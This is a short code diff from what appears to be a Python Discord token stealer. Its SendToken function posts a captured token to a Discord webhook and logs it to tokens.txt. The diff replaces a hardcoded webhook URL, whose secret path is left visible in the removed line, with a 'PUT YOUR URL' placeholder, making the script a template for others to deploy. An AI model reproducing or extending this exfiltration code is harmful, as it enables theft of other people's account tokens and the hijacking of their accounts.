@@ -8,7 +8,7 @@ from os import walk
 verbose = True
 
 def SendToken(token):
-    webhook_url = 'https://discord.com/api/webhooks/918845694364749835/MFTqX9Tje-NnuuJfG_bdbDRtKgwWU7ZsNUvETCckok0PdfnKifFdCa_5FDw0VpT5pcg6'
+    webhook_url = 'PUT YOUR URL'
     webhook = DiscordWebhook(url=webhook_url, content=f'`{token}`')
     webhook.execute()
     with open('tokens.txt', 'a') as t:
